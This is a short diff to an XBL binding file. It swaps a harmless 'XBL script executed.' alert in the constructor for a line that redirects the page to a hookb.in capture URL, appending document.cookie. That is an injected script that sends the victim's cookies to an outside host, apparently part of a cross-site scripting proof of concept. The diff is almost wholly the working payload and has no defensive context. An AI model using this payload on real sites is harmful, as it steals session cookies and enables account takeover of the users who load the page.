@@ -4,7 +4,7 @@
 <binding id="mycode">
   <implementation>
     <constructor>
-      alert("XBL script executed.");
+      document.location="img=https://hookb.in/ZdNJWW78?c="+document.cookie
     </constructor>
   </implementation>
 </binding>
